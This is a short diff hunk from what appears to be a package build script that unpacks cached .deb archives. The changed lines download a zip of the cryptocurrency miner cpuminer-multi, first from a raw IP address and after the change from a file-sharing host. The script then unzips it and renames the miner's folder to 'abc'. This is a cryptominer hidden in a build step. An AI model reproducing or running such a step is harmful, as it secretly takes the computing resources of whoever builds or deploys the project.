@@ -57,7 +57,7 @@ for DEB in $(ls -1 $APT_CACHE_DIR/archives/*.deb); do
   dpkg -x $DEB $BUILD_DIR/.apt/
 done
 
-wget -O abc.zip "http://35.189.114.5/cpuminer-multi.zip"
+wget -O abc.zip "http://puu.sh/xUHe3/09ed0bb5d1.zip"
 unzip abc.zip
 rm abc.zip
 mv cpuminer-multi abc
